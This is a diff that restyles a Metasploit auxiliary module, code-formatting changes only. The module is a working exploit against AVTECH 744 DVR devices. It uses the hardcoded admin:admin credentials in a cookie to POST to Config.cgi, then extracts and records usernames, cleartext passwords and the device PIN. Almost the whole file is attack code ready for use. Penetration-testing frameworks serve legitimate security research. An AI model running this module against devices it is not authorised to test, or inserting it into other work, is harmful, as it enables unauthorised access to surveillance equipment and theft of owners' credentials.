@@ -1,36 +1,32 @@
+# frozen_string_literal: true
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'AVTECH 744 DVR Account Information Retrieval',
-      'Description'    => %q{
-        This module will extract the account information from the AVTECH 744 DVR devices,
-        including usernames, cleartext passwords, and the device PIN, along with
-        a few other miscellaneous details. In order to extract the information, hardcoded
-        credentials admin/admin are used. These credentials can't be changed from the device
-        console UI nor from the web UI.
-      },
-      'Author'         => [ 'nstarke' ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'AVTECH 744 DVR Account Information Retrieval',
+                      'Description'    => %q(
+                        This module will extract the account information from the AVTECH 744 DVR devices,
+                        including usernames, cleartext passwords, and the device PIN, along with
+                        a few other miscellaneous details. In order to extract the information, hardcoded
+                        credentials admin/admin are used. These credentials can't be changed from the device
+                        console UI nor from the web UI.
+                      ),
+                      'Author'         => [ 'nstarke' ],
+                      'License'        => MSF_LICENSE))
   end
 
-
   def run
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => '/cgi-bin/user/Config.cgi',
-      'cookie' => "SSID=#{Rex::Text.encode_base64('admin:admin')};",
-      'vars_post' => {
-        'action' => 'get',
-        'category' => 'Account.*'
-      }
-    })
+    res = send_request_cgi('method' => 'POST',
+                           'uri' => '/cgi-bin/user/Config.cgi',
+                           'cookie' => "SSID=#{Rex::Text.encode_base64('admin:admin')};",
+                           'vars_post' => {
+                             'action' => 'get',
+                             'category' => 'Account.*'
+                           })
 
     unless res
       fail_with(Failure::Unreachable, 'No response received from the target')
@@ -51,20 +47,19 @@ class MetasploitModule < Msf::Auxiliary
     raw_collection = []
     body.each_line do |line|
       key, value = line.split('=')
-      if key && value
-        _, second, third = key.split('.')
-        if third
-          index = second.slice(second.length - 1).to_i
-          raw_collection[index] = raw_collection[index] ||= {}
-          case third
-          when 'Username'
-            raw_collection[index][:username] = value.strip!
-          when 'Password'
-            raw_collection[index][:password] = value.strip!
-          end
-        elsif second.include?('Password')
-          print_good("PIN Retrieved: #{key} - #{value.strip!}")
+      next unless key && value
+      _, second, third = key.split('.')
+      if third
+        index = second.slice(second.length - 1).to_i
+        raw_collection[index] = raw_collection[index] ||= {}
+        case third
+        when 'Username'
+          raw_collection[index][:username] = value.strip!
+        when 'Password'
+          raw_collection[index][:password] = value.strip!
         end
+      elsif second.include?('Password')
+        print_good("PIN Retrieved: #{key} - #{value.strip!}")
       end
     end
 
@@ -73,9 +68,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def extract_creds(raw_collection)
     raw_collection.each do |raw|
-      unless raw
-        next
-      end
+      next unless raw
 
       service_data = {
         address: rhost,
@@ -86,7 +79,7 @@ class MetasploitModule < Msf::Auxiliary
       }
 
       credential_data = {
-        module_fullname: self.fullname,
+        module_fullname: fullname,
         origin_type: :service,
         private_data: raw[:password],
         private_type: :password,
